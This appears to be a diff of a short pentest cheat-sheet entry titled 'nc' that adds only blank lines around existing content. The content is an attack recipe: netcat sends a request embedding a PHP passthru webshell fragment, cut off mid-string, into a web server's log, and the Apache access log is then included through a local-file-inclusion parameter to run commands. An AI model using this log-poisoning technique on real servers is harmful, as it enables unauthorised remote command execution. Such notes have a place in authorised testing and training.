@@ -9,9 +9,17 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # nc
 
+
+
 **Code**: [[
 nc target-ip target-port
 GET /<?php passthru($_GE]]
+
+
+
+
+
+
 
 **Command** ([[Afterwards include the it via lfi]]):
 
@@ -19,3 +27,9 @@ GET /<?php passthru($_GE]]
 ?lfi_file=/var/log/apache2/access.log&cmd=<command>
 
 ```
+
+
+
+
+
+
